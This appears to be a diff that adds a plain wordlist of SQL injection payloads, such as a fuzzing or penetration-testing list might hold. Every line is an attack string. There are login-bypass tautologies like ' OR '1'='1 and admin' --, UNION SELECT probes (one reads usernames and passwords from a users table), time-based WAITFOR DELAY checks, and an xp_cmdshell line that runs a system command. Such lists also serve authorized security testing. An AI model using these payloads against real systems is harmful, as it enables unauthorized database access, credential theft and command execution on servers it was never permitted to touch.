@@ -1,0 +1,36 @@
+' OR '1'='1
+' OR '1'='1' --
+' OR 1=1 --
+' OR 1=1 #
+' OR 1=1/*
+admin' --
+admin' #
+admin'/*
+admin' OR '1'='1
+admin' OR '1'='1' --
+1' OR '1'='1
+1' OR '1'='1' --
+1 OR 1=1 --
+' OR '' = '
+' OR 'x'='x
+1' OR '1'='1' LIMIT 1 --
+1 UNION SELECT 1,2,3 --
+1' UNION SELECT 1,2,3 --
+' UNION SELECT null,null,null --
+' UNION SELECT username,password,null FROM users --
+' OR username IS NOT NULL --
+' OR userid IS NOT NULL --
+' OR id IS NOT NULL --
+' OR user_id IS NOT NULL --
+' OR uid IS NOT NULL --
+" OR "1"="1
+" OR "1"="1" --
+" OR ""="
+" OR "x"="x
+1" OR "1"="1
+1" OR "1"="1" --
+'); WAITFOR DELAY '0:0:5' --
+';WAITFOR DELAY '0:0:5' --
+));WAITFOR DELAY '0:0:5' --
+);WAITFOR DELAY '0:0:5' --
+';EXEC master..xp_cmdshell 'ping 127.0.0.1' -- 
